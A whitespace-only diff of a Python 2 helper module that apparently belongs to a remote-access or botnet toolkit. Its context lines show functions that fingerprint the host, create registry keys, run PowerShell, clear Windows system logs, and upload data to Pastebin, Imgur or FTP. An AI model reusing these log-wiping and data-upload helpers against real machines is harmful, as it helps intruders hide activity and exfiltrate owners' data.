@@ -6,7 +6,7 @@ _debug = False
 
 # main
 def log(info, level='debug'):
-    """
+    """ 
     Log output to the console (if verbose output is enabled)
 
     """
@@ -16,14 +16,14 @@ def log(info, level='debug'):
     getattr(logger, level if hasattr(logger, level) else 'debug')(str(info))
 
 def imports(source, target=None):
-    """
+    """ 
     Attempt to import each package into the module specified
 
     `Required`
     :param list source: package/module to import
 
     `Optional`
-    :param object target: target object/module to import into
+    :param object target: target object/module to import into 
 
     """
     if isinstance(source, str):
@@ -41,7 +41,7 @@ def imports(source, target=None):
             log("missing package '{}' is required".format(source))
 
 def is_compatible(platforms=['win32','linux2','darwin'], module=None):
-    """
+    """ 
     Verify that a module is compatible with the host platform
 
     `Optional`
@@ -56,7 +56,7 @@ def is_compatible(platforms=['win32','linux2','darwin'], module=None):
     return False
 
 def platform():
-    """
+    """ 
     Return the system platform of host machine
 
     """
@@ -64,7 +64,7 @@ def platform():
     return sys.platform
 
 def public_ip():
-    """
+    """ 
     Return public IP address of host machine
 
     """
@@ -72,7 +72,7 @@ def public_ip():
     return urllib.urlopen('http://api.ipify.org').read()
 
 def local_ip():
-    """
+    """ 
     Return local IP address of host machine
 
     """
@@ -80,7 +80,7 @@ def local_ip():
     return socket.gethostbyname(socket.gethostname())
 
 def mac_address():
-    """
+    """ 
     Return MAC address of host machine
 
     """
@@ -88,7 +88,7 @@ def mac_address():
     return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()
 
 def architecture():
-    """
+    """ 
     Check if host machine has 32-bit or 64-bit processor architecture
 
     """
@@ -96,7 +96,7 @@ def architecture():
     return int(struct.calcsize('P') * 8)
 
 def device():
-    """
+    """ 
     Return the name of the host machine
 
     """
@@ -104,7 +104,7 @@ def device():
     return socket.getfqdn(socket.gethostname())
 
 def username():
-    """
+    """ 
     Return username of current logged in user
 
     """
@@ -112,7 +112,7 @@ def username():
     return os.getenv('USER', os.getenv('USERNAME', 'user'))
 
 def administrator():
-    """
+    """ 
     Return True if current user is administrator, otherwise False
 
     """
@@ -121,7 +121,7 @@ def administrator():
     return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name == 'nt' else os.getuid() == 0)
 
 def ipv4(address):
-    """
+    """ 
     Check if valid IPv4 address
 
     `Required`
@@ -138,7 +138,7 @@ def ipv4(address):
         return False
 
 def status(timestamp):
-    """
+    """ 
     Check the status of a job/thread
 
     `Required`
@@ -154,7 +154,7 @@ def status(timestamp):
     return ', '.join([i for i in data if i])
 
 def post(url, headers={}, data={}, json={}, as_json=False):
-    """
+    """ 
     Make a HTTP post request and return response
 
     `Required`
@@ -190,9 +190,9 @@ def post(url, headers={}, data={}, json={}, as_json=False):
                 output = json.loads(output)
             except: pass
         return output
-
+    
 def normalize(source):
-    """
+    """ 
     Normalize data/text/stream
 
     `Required`
@@ -212,7 +212,7 @@ def normalize(source):
         return bytes(source)
 
 def registry_key(key, subkey, value):
-    """
+    """ 
     Create a new Windows Registry Key in HKEY_CURRENT_USER
 
     `Required`
@@ -234,7 +234,7 @@ def registry_key(key, subkey, value):
         return False
 
 def png(image):
-    """
+    """ 
     Transforms raw image data into a valid PNG data
 
     `Required`
@@ -278,7 +278,7 @@ def png(image):
     return fileh.getvalue()
 
 def delete(target):
-    """
+    """ 
     Tries to delete file via multiple methods, if necessary
 
     `Required`
@@ -298,7 +298,7 @@ def delete(target):
     except OSError: pass
 
 def clear_system_logs():
-    """
+    """ 
     Clear Windows system logs (Application, security, Setup, System)
 
     """
@@ -311,7 +311,7 @@ def clear_system_logs():
         log(e)
 
 def kwargs(data):
-    """
+    """ 
     Takes a string as input and returns a dictionary of keyword arguments
 
     `Required`
@@ -326,7 +326,7 @@ def kwargs(data):
         log(e)
 
 def powershell(code):
-    """
+    """ 
     Execute code in Powershell.exe and return any results
 
     `Required`
@@ -344,7 +344,7 @@ def powershell(code):
         log("{} error: {}".format(powershell.func_name, str(e)))
 
 def display(output, color=None, style=None, end='\n', event=None, lock=None):
-    """
+    """ 
     Display output in the console
 
     `Required`
@@ -353,10 +353,10 @@ def display(output, color=None, style=None, end='\n', event=None, lock=None):
     `Optional`
     :param str color:     red, green, cyan, magenta, blue, white
     :param str style:     normal, bright, dim
-    :param str end:       __future__.print_function keyword arg
+    :param str end:       __future__.print_function keyword arg                                                       
     :param lock:          threading.Lock object
     :param event:         threading.Event object
-
+ 
     """
     import colorama
     colorama.init()
@@ -370,7 +370,7 @@ def display(output, color=None, style=None, end='\n', event=None, lock=None):
     exec("print(_color + _style + output){}".format(end))
 
 def color():
-    """
+    """ 
     Returns a random color for use in console display
 
     """
@@ -381,8 +381,8 @@ def color():
         log("{} error: {}".format(color.func_name, str(e)))
 
 def imgur(source, api_key=None):
-    """
-    Upload image file/data to Imgur
+    """ 
+    Upload image file/data to Imgur 
 
     """
     import base64
@@ -393,7 +393,7 @@ def imgur(source, api_key=None):
         log("No Imgur API key found")
 
 def pastebin(source, api_key):
-    """
+    """ 
     Upload file/data to Pastebin
 
     `Required`
@@ -409,7 +409,7 @@ def pastebin(source, api_key):
         try:
             info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
             paste = post('https://pastebin.com/api/api_post.php', data=info)
-            parts = urllib2.urlparse.urlsplit(paste)
+            parts = urllib2.urlparse.urlsplit(paste)       
             return urllib2.urlparse.urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
         except Exception as e:
             log("Upload to Pastebin failed with error: {}".format(e))
@@ -417,7 +417,7 @@ def pastebin(source, api_key):
         log("No Pastebin API key found")
 
 def ftp(source, host=None, user=None, password=None, filetype=None):
-    """
+    """ 
     Upload file/data to FTP server
 
     `Required`
@@ -464,7 +464,7 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
         log('missing one or more required arguments: host, user, password')
 
 def config(*arg, **options):
-    """
+    """ 
     Configuration decorator for adding attributes (e.g. declare platforms attribute with list of compatible platforms)
 
     """
@@ -479,7 +479,7 @@ def config(*arg, **options):
     return _config
 
 def threaded(function):
-    """
+    """ 
     Decorator for making a function threaded
 
     `Required`
@@ -496,4 +496,4 @@ def threaded(function):
         t.start()
         return t
     return _threaded
-
+  
